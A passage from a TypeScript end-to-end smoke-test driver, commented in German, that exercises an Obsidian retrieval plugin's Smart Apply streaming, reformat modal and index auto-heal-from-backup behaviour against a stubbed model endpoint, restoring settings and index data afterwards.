            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            p.settings.smartApplyEnabled = !!window.__w14SmartWas; delete window.__w14SmartWas;
            await p.saveSettings();
            await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
            await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
            return true;`).catch(() => console.log("  ! Smart Apply konnte nicht zurückgestellt werden"));
          await pollUntil(main, `return !!app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.api?.status().indexed;`, 30_000, 500).catch(() => false);
        }
        if (smartBody) {
          record(W7I.smart, smartBody.temperature === 0.1 && typeof smartBody.max_tokens === "number" && (smartBody.max_tokens as number) >= 4096,
            `temperature=${String(smartBody.temperature)} · max_tokens=${String(smartBody.max_tokens)}`);
        } else {
          unmeasured(W7I.smart, `${smartWhy} — nichts gemessen`);
        }
      } finally {
        await main.evaluate(`
          if (window.__w14Send) XMLHttpRequest.prototype.send = window.__w14Send;
          delete window.__w14Send; delete window.__w14Bodies;
          const m = document.querySelector(".vault-rag-reformat-result")?.closest(".modal");
          const d = m && [...m.querySelectorAll("button")].find(b => /verwerf|discard/i.test(b.textContent || ""));
          if (d) d.click();
          try { window.__w14Leaf?.detach(); } catch {} delete window.__w14Leaf;
          const f = app.vault.getAbstractFileByPath("w14-body-probe.md");
          if (f) await app.vault.delete(f);
          return true;`).catch(() => console.log("  ! Body-Haken oder Probe-Notiz konnten nicht zurückgesetzt werden"));
      }
    }

    // --- 7j. Stream-Bereiche (Welle 20): Folge-Regel und Denkblock im Strom ---------------------
    // Gegen den zentralen Stub der Stub-Lage: tokengroße Stücke (8 Zeichen) im kurzen Takt, der Strom hält danach offen
    // (`nachlaufMs`), damit die Messung nie am Schluss-Draw liegt. Smart Apply streamt mit Reasoning in einen Bereich mit
    // eigener Höhe (220 px, scrollt selbst); das Umformulieren-Modal hat kein Reasoning und scrollt über `contentEl`.
    {
      const N = STREAM_PUNKTE;
      if (!stubLage) {
        for (const n of Object.values(N)) unmeasured(n, "Stub-Lage nicht hergestellt — nichts gemessen");
      } else {
        const stub = stubLage;
        const zeilen = (k: number): string => Array.from({ length: k }, (_, i) => `Zeile ${String(i + 1).padStart(3, "0")}: abcdefghij klmnopqrs\n`).join("");
        // Absatzgroße Stücke: fünf Zeilen je Stück.
        const absaetze = (k: number): string[] => Array.from({ length: k }, (_, j) => Array.from({ length: 5 }, (_, i) => `Absatz ${String(j + 1).padStart(2, "0")} Zeile ${i + 1}: abcdefghij klmnopqrs\n`).join("") + "\n");
        const denken = "Ich ordne die Abschnitte der Vorlage zu und prüfe ihre Reihenfolge. ".repeat(10);
        // --- Smart Apply -----------------------------------------------------------------------------
        let saWas = false;
        const saZurueck = async (): Promise<void> => {
          await main.evaluate(`
            document.querySelector(".vault-rag-sa-stop")?.click();
            try { window.__w20Leaf?.detach(); } catch {} delete window.__w20Leaf;
            return true;`).catch(() => undefined);
          await stub.trenneAlle();
          if (saWas) {
            await main.evaluate(`
              const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
              p.settings.smartApplyEnabled = !!window.__w20SmartWas; delete window.__w20SmartWas;
              await p.saveSettings();
              await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
              await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
              return true;`).catch(() => console.log("  ! Smart Apply konnte nicht zurückgestellt werden"));
            // Im Abbruch nur zurückschreiben, nicht warten: der Schritt hat höchstens eine Sekunde.
            if (!istAbgebrochen()) await pollUntil(main, `return !!app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.api?.status().indexed;`, 30_000, 500).catch(() => false);
          }
          stub.antworten([]);
        };
        const saZustand = beimAbbruch(saZurueck, "Smart Apply zurückstellen");
        try {
          stub.antworten([{ reasoning: denken, text: zeilen(120), laenge: 8, takt: 40, nachlaufMs: 6000 }]);
          await main.evaluate(`
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            window.__w20SmartWas = !!p.settings.smartApplyEnabled;
            p.settings.smartApplyEnabled = true; await p.saveSettings();
            await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
            await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
            return true;`);
          saWas = true;
          await pollUntil(main, `return !!app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.api?.status().indexed;`, 30_000, 500).catch(() => false);
          const gestartet = await main.evaluate<boolean>(`
            const f = app.vault.getMarkdownFiles().find(x => x.path.startsWith("Notes/") && x.stat.size > 200 && !x.path.startsWith("Notes/Integrator"));
            if (!f) return false;
            const leaf = app.workspace.getLeaf("tab"); window.__w20Leaf = leaf;
            await leaf.openFile(f, { state: { mode: "source" } });
            app.workspace.setActiveLeaf(leaf, { focus: true });
            await new Promise(r => setTimeout(r, 800));
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            await p.openHub("smart-apply");
            await new Promise(r => setTimeout(r, 2500));
            const run = document.querySelector(".vault-rag-sa-run");
            if (!run || run.disabled || run.classList.contains("is-disabled")) return false;
            run.click();
            return true;`);
          if (!gestartet) {
            for (const n of [N.saKontrolle, N.saFolge, N.saWieder, N.saDenk, N.saAbsatz]) unmeasured(n, "Lauf-Knopf nicht bedienbar (keine Vorlage/Notiz im Fixture?) — nichts gemessen");
          } else {
            // Denkblock live: Reasoning wächst, bevor die Antwort beginnt.
            const denkSel = `const r = document.querySelector(".vault-rag-sa-running-stream .okit-stream-reasoning pre"); const t = document.querySelector(".vault-rag-sa-running-stream .okit-stream-tail"); const d = document.querySelector(".vault-rag-sa-running-stream .okit-stream-reasoning");
              return { denk: r ? (r.textContent || "").length : -1, tail: t ? (t.textContent || "").length : -1, offen: Boolean(d && d.open) };`;
            const erst = await pollUntil<{ denk: number; tail: number; offen: boolean }>(main, `const m = (() => { ${denkSel} })(); return m.denk > 0 ? m : null;`, 20_000, 100);
            if (!erst) record(N.saDenk, false, "kein Reasoning-Text im laufenden Bereich innerhalb von 20 s");
            else {
              await new Promise((r) => setTimeout(r, 700));
              const zweit = await main.evaluate<{ denk: number; tail: number; offen: boolean }>(denkSel);
              if (zweit.tail > 0 || stub.zaehler().unterwegs === 0) unmeasured(N.saDenk, `Messung ungültig: der Strom war beim zweiten Messwert schon bei der Antwort (${zweit.tail} Zeichen) oder zu Ende`);
              else record(N.saDenk, erst.tail === 0 && erst.offen && zweit.denk > erst.denk,
                `Denktext ${erst.denk} → ${zweit.denk} Zeichen, Antwort ${erst.tail} → ${zweit.tail} Zeichen, Block offen: ${erst.offen ? "ja" : "nein"}`);
            }
            // Folge-Regel in der Antwortphase (der Bereich selbst scrollt: .okit-stream-body, 220 px hoch).
            zeichneFolge(bilanz, { kontrolle: N.saKontrolle, folge: N.saFolge, wiederaufnahme: N.saWieder }, await messeFolge(main, { selector: ".vault-rag-sa-running-stream .okit-stream-body", laeuft: () => stub.zaehler().unterwegs > 0, wiederaufnahme: true }));
            // Zweiter Lauf mit absatzgroßen Stücken (fünf Zeilen je Stück, jedes mehr als die Folge-Schwelle von 40 px): vor
            // obsidian-kit 0.59.0 maß `followTail` „unten?“ erst NACH dem Wachsen und gab nach dem ersten Absatz auf.
            await main.evaluate(`document.querySelector(".vault-rag-sa-stop")?.click(); return true;`);
            await stub.trenneAlle();
            await new Promise((r) => setTimeout(r, 1500));
            stub.antworten([{ stuecke: absaetze(24), takt: 300, nachlaufMs: 6000 }]);
            const nochmal = await main.evaluate<boolean>(`
              const run = document.querySelector(".vault-rag-sa-run");
              if (!run || run.disabled || run.classList.contains("is-disabled")) return false;
              run.click(); return true;`);
            if (!nochmal) unmeasured(N.saAbsatz, "Lauf-Knopf nach dem Abbruch nicht bedienbar — nichts gemessen");
            else {
              const ab = await messeFolge(main, { selector: ".vault-rag-sa-running-stream .okit-stream-body", laeuft: () => stub.zaehler().unterwegs > 0, stoerung: false });
              zeichneFolge(bilanz, { kontrolle: N.saAbsatz }, ab);
            }
          }
        } catch (e) {
          for (const n of [N.saKontrolle, N.saFolge, N.saWieder, N.saDenk, N.saAbsatz]) if (!bilanz.eintraege().some((x) => x.name === n)) unmeasured(n, `Messung abgebrochen: ${String(e)}`);
        } finally {
          await saZustand.schliesse();
        }
        // --- Umformulieren-Modal ---------------------------------------------------------------------
        skipped(N.rfDenk, "in dieser Lage nicht anwendbar: das Modal zeigt kein Reasoning (stream kennt nur onToken)");
        const rfZurueck = async (): Promise<void> => {
          await main.evaluate(`
            const m = document.querySelector(".vault-rag-reformat-result")?.closest(".modal");
            const d = m && [...m.querySelectorAll("button")].find(b => /verwerf|discard/i.test(b.textContent || ""));
            if (d) d.click();
            try { window.__w20Leaf?.detach(); } catch {} delete window.__w20Leaf;
            return true;`).catch(() => undefined);
          await stub.trenneAlle();
          stub.antworten([]);
        };
        const rfZustand = beimAbbruch(rfZurueck, "Umformulieren-Modal schließen");
        try {
          for (const variante of ["token", "absatz"] as const) {
          stub.antworten([variante === "token" ? { text: zeilen(120), laenge: 8, takt: 40, nachlaufMs: 6000 } : { stuecke: absaetze(24), takt: 300, nachlaufMs: 6000 }]);
          const gestartet = await main.evaluate<boolean>(`
            let f = app.vault.getAbstractFileByPath("w14-body-probe.md");
            if (!f) f = await app.vault.create("w14-body-probe.md", "Ein kurzer Satz zum Umformen.\\n");
            const leaf = app.workspace.getLeaf("tab"); window.__w20Leaf = leaf;
            await leaf.openFile(f, { state: { mode: "source" } });
            app.workspace.setActiveLeaf(leaf, { focus: true });
            await new Promise(r => setTimeout(r, 600));
            const ed = app.workspace.activeEditor?.editor; if (!ed) return false;
            ed.setSelection({ line: 0, ch: 0 }, { line: 0, ch: ed.getLine(0).length });
            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
            p.captureSelection(); p.reformatPanel?.refresh();
            app.commands.executeCommandById("vault-retrieval:open-reformat");
            await new Promise(r => setTimeout(r, 800));
            const nodes = [...document.querySelectorAll(".vault-rag-reformat-group-title, .vault-rag-reformat-btn")];
            let titles = 0; const llm = [];
            for (const n of nodes) {
              if (n.classList.contains("vault-rag-reformat-group-title")) { titles++; continue; }
              if (titles === 2 && !n.closest(".vault-rag-reformat-freetext")) llm.push(n);
            }
            const usable = llm.filter(b => !b.disabled);
            if (!usable.length) return false;
            usable[0].click();
            return true;`);
          if (!gestartet) for (const n of variante === "token" ? [N.rfKontrolle, N.rfFolge, N.rfWieder] : [N.rfAbsatz]) unmeasured(n, "Probe-Notiz/Auswahl nicht herstellbar — nichts gemessen");
          else if (variante === "token") zeichneFolge(bilanz, { kontrolle: N.rfKontrolle, folge: N.rfFolge, wiederaufnahme: N.rfWieder }, await messeFolge(main, { selector: ".vault-rag-reformat-modal", laeuft: () => stub.zaehler().unterwegs > 0, wiederaufnahme: true }));
          else zeichneFolge(bilanz, { kontrolle: N.rfAbsatz }, await messeFolge(main, { selector: ".vault-rag-reformat-modal", laeuft: () => stub.zaehler().unterwegs > 0, stoerung: false }));
          // Modal verwerfen, Strom kappen, Notiz-Tab schließen, bevor die nächste Variante startet.
          await main.evaluate(`
            const m = document.querySelector(".vault-rag-reformat-result")?.closest(".modal");
            const d = m && [...m.querySelectorAll("button")].find(b => /verwerf|discard/i.test(b.textContent || ""));
            if (d) d.click();
            try { window.__w20Leaf?.detach(); } catch {} delete window.__w20Leaf;
            return true;`).catch(() => undefined);
          await stub.trenneAlle();
          await new Promise((r) => setTimeout(r, 800));
          }
        } catch (e) {
          for (const n of [N.rfKontrolle, N.rfFolge, N.rfWieder, N.rfAbsatz]) if (!bilanz.eintraege().some((x) => x.name === n)) unmeasured(n, `Messung abgebrochen: ${String(e)}`);
        } finally {
          await rfZustand.schliesse();
        }
      }
    }

    // --- 8. Auto-Heal-Kaskade: defekter Container ohne Endpunkt ------------
    // Der einzige Prüfpunkt, der die VERDRAHTUNG misst statt der Entscheidung. `planAutoHeal`
    // ist unit-getestet — der Bug von 2026-08-14 lag aber in `attemptAutoHeal`: die
    // Backup-Übernahme hing hinter einem `if (!ready) return`, wer offline war blieb dauerhaft
    // auf dem defekten Container sitzen. Genau diese Kombination wird hier hergestellt:
    // Container kaputt UND kein erreichbarer Embedding-Endpunkt. Vor dem Fix bliebe der Index
    // dauerhaft weg — das ist die Gegenprobe, die den Punkt aussagekräftig macht.
    //
    // Der Prüfpunkt fasst echte Nutzerdaten an (`index.bin` liegt im gesyncten Vault). Er
    // sichert die Original-Bytes im Renderer, bevor er sie kippt, und das `finally` schreibt
    // sie zurück; die Auto-Heal-Kaskade selbst ist die zweite Absicherung.
    const healPre = await main.evaluate<{ ok: boolean; reason?: string; noteCount?: number; indexPath?: string; backups?: number }>(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const before = p.api.status();
      if (!before.indexed || !before.noteCount) return { ok: false, reason: "kein geladener Index" };
      const backups = await p.listBackups();
      if (!backups.length) return { ok: false, reason: "kein geräte-lokales Backup vorhanden" };
      const indexPath = p.settings.indexDir + "/index.bin";
      // Original-Bytes im Renderer parken statt 1,4 MB über die CDP-Grenze zu schieben.
      window.__vaultRagSmokeIndex = await app.vault.adapter.readBinary(indexPath);
      return { ok: true, noteCount: before.noteCount, indexPath, backups: backups.length };
    `);

    if (!healPre.ok) {
      console.log(`  – Auto-Heal-Kaskade: übersprungen — ${healPre.reason ?? "Voraussetzung fehlt"}`);
    } else {
      const indexPath = healPre.indexPath as string;
      // Ab hier ist Aufräumen Pflicht — Marke setzen, BEVOR irgendetwas verändert wird.
      healRestore = { indexPath, savedEndpoints: null };
      const saved = await main.evaluate<unknown>(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        const saved = JSON.parse(JSON.stringify(p.settings.embeddingEndpoints));
        // Notices MITSCHREIBEN statt am Ende nachsehen: sie blenden nach 10 s aus, die Kaskade
        // darf aber bis zu 90 s brauchen. Ein Blick danach misst nur, wer zufaellig noch steht.
        //
        // ACHTUNG: beobachtet wird activeDocument, NICHT document — an Obsidian 1.13.7 gemessen:
        // eine Notice landet im aktiven Fenster, und sobald ein Treiber app.setting.open()
        // gemacht hat, ist das Obsidians Einstellungs-FENSTER (eigenes Dokument im selben
        // Renderer). n.noticeEl.getRootNode() === document ist dann false und
        // document.querySelectorAll(".notice") bleibt leer — auch nach Page.bringToFront.
        // Wer hier document nimmt, misst "keine Notice", obwohl eine da war.
        // (Kein Backtick in diesem Block: der Renderer-Code steht selbst in einem Template-Literal.)
        // Beide Dokumente zu beobachten ist billiger als zu raten, welches gerade gilt.
        window.__vaultRagSmokeNotices = [];
        const collect = (records) => {
          for (const rec of records) {
            for (const node of rec.addedNodes) {
              if (node.nodeType !== 1) continue;
              const hit = node.classList.contains("notice") ? node : node.querySelector?.(".notice");
              if (hit) window.__vaultRagSmokeNotices.push(hit.textContent.trim());
            }
          }
        };
        window.__vaultRagSmokeObservers = [];
        const docs = new Set([document, typeof activeDocument !== "undefined" ? activeDocument : document]);
        for (const doc of docs) {
          const obs = new MutationObserver(collect);
          obs.observe(doc.body, { childList: true, subtree: true });
          window.__vaultRagSmokeObservers.push(obs);
        }
        // Endpunkt tot stellen — über die Einstellungen, nicht über das Netz: ein Port, auf dem
        // nichts lauscht, ist der einzige Weg, "kein Embedder" reproduzierbar herzustellen.
        p.settings.embeddingEndpoints = [{ url: "http://127.0.0.1:9" }];
        await p.saveSettings();
        // Container kippen: EIN Byte hinter dem Header genügt, die CRC32 des Payloads schlägt an.
        // Truncaten wäre der falsche Reiz — das ergibt "no-index", einen anderen Pfad.
        const bytes = new Uint8Array(window.__vaultRagSmokeIndex.slice(0));
        const at = Math.floor(bytes.length / 2);
        bytes[at] = bytes[at] ^ 0xff;
        await app.vault.adapter.writeBinary(${JSON.stringify("__PATH__")}, bytes.buffer);
        // Neu laden: der Reload ist der einzige Weg in loadIndex() → corrupt → attemptAutoHeal.
        await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
        await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
        return saved;
      `.replace("__PATH__", indexPath));
      healRestore.savedEndpoints = saved;

      // Warten auf der NODE-Seite: die Kaskade läuft detacht (Backup lesen, CRC prüfen,
      // persistieren) und braucht bei 1,4 MB spürbar länger als ein Renderer-Tick.
      const healed = await pollUntil<{ indexed: boolean; noteCount: number }>(main, `
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        if (!p || !p.api) return null;
        const s = p.api.status();
        return s.indexed ? s : null;
      `, 90_000, 2000);
      const healNotices = await main.evaluate<string[]>(`
        const seen = window.__vaultRagSmokeNotices || [];
        for (const obs of window.__vaultRagSmokeObservers || []) obs.disconnect();
        delete window.__vaultRagSmokeObservers;
        delete window.__vaultRagSmokeNotices;
        return seen;
      `);

      record("Defekter Container heilt sich ohne Endpunkt aus dem Backup",
        healed !== null && healed.noteCount > 0,
        healed
          ? `${healed.noteCount} Notizen wieder da (vorher ${healPre.noteCount ?? 0})`
          : "Index blieb weg — vor dem Fix von 0.24.0 war genau das das Verhalten");
      // Die Notice ist Teil der Zusage: das Backup kann älter sein, und der Nutzer muss das
      // erfahren, statt einen stillschweigend unvollständigen Index zu benutzen.
      //
      // NUR DIE EIGENEN NOTICES ZAEHLEN. `.notice` ist Obsidians GETEILTER Toast — jedes
      // installierte Plugin schreibt hinein. Ein Punkt, der bloss `length > 0` prueft, wird von
      // einer fremden Meldung gruen gemacht, die zufaellig in dieselben bis zu 90 Sekunden
      // faellt; er belegt dann nichts ueber unsere Heilung. (Dach-Messung 2026-08-30: sechs
      // Treiber lesen den geteilten Kanal, drei ungefiltert — dieser war einer davon. In
      // koda-agent war dieselbe Fehlerklasse an `.view-action`/`.modal-container` zweimal die
      // Ursache, einmal fuer einen gruenen Punkt, der seinen Gegenstand nie beruehrt hat.)
      // Erkannt am Plugin-Praefix, das unsere Notices tragen ("Vault Retrieval: " bzw.
      // "vault-rag: ") — beide Schreibweisen kommen in `src/i18n/strings.ts` vor.
      const ownNotice = /vault[-\s]?rag|vault retrieval/i;
      const healOwn = healNotices.filter(n => ownNotice.test(n));
      const healForeign = healNotices.filter(n => !ownNotice.test(n));
      record("Die Heilung meldet sich, statt still einen aelteren Stand zu benutzen",
        healOwn.length > 0,
        healOwn.length
          ? `„${healOwn.join(" | ").slice(0, 160)}“`
          : `keine EIGENE Notice waehrend des Laufs${healForeign.length ? ` (${healForeign.length} fremde gesehen und verworfen)` : ""}`);
    }
    } // Ende nachlauf

  } finally {
    await zustand.schliesse();
    // Nach Ctrl-C druckt das Abbruch-Modul die Bilanz und beendet den Prozess selbst; hier weiterzulaufen hieße, sie zweimal zu drucken.
    if (istAbgebrochen()) return;
    settings?.close();
    main.close();
  }

  // Die Abschlusszeile trägt alle vier Zustände: ein nie erreichter Punkt gehört IN sie (CORE-TEST-19), sonst liest sich
  // „23 grün“ wie ein vollständiger Lauf. `abschluss()` setzt Exit 1 bei Rot ODER nichts gemessen.
  bilanz.abschluss();
  for (const p of bilanz.eintraege()) {
    if (p.zustand === "rot" || p.zustand === "nichts-gemessen") console.log(`  ${p.zustand === "rot" ? "✗" : "?"} ${p.name} — ${p.detail}`);
  }
  // Die Herkunfts-Warnung steht NACH der Bilanz, nicht davor: sie erscheint sonst am Anfang eines mehrminütigen Laufs
  // und ist beim Ablesen des Ergebnisses längst weggescrollt (2026-08-30: 69 Prüfpunkte auf nicht belegtem Code).
  if (herkunftsWarnung) {
    console.log(`\n⚠️  Herkunft des gemessenen Builds UNGEKLÄRT — die Bilanz oben belegt nicht,`);
    console.log(`   dass sie für den Repo-Stand gilt:\n   ${herkunftsWarnung}`);
  }
}

runDriver(main);
